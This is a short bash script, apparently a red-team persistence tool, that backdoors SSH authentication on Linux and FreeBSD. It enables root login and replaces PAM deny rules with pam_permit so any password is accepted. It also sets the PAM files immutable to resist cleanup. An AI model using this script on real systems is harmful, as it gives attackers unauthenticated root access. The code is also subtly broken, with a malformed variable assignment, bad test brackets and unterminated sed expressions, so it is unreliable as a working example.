#!/bin/bash

# Developed by Robert Gray <rpg4231@rit.edu>

OS = $(uname)

if [ "$OS" == "Linux"]
then
	#CentOS
	PAM_FILE="/etc/pam.d/password_auth"
elif [ "$OS" == "FreeBSD"]
then
	PAM_FILE="/etc/pam.d/sshd"
	chflags noschg "$PAM_FILE"
	grep -qxF 'pam_enable="YES"' /etc/rc.conf || echo 'pam_enable="YES"' >> /etc/rc.conf
fi

if [ "$OS" == "Linux" ]
then
	chattr -i "$PAM_FILE"
elif [ "$OS" == "FreeBSD" ]
then
	chflags noschg "$PAM_FILE"
fi

sed -i -e 's/UsePAM no/UsePAM yes/' /etc/ssh/sshd_config
sed -i -e 's/#PermitRootLogin/PermitRootLogin' /etc/ssh/sshd_config
sed -i -e 's/PermitRootLogin no/PermitRootLogin yes' /etc/ssh/sshd_config
if [ "$?" != "0" ]
then
	echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
fi

if [ "$OS" == "Linux" ]
then
	sed -i -e 's/auth	required	pam_deny.so/auth	required	pam_permit.so/' "$PAM_FILE"
elif [ "$OS" == "FreeBSD" ]
then
	sed -i -e 's/auth	required	pam_unix.so/auth	sufficient	pam_unix.so/' "$PAM_FILE"
	echo "auth	required	pam_permit.so" >> "$PAM_FILE"
fi

if [ "$OS" == "Linux" ]
then
	chattr +i "$PAM_FILE"
elif [ "$OS" == "FreeBSD" ]
then
	chflags schg "$PAM_FILE"
fi
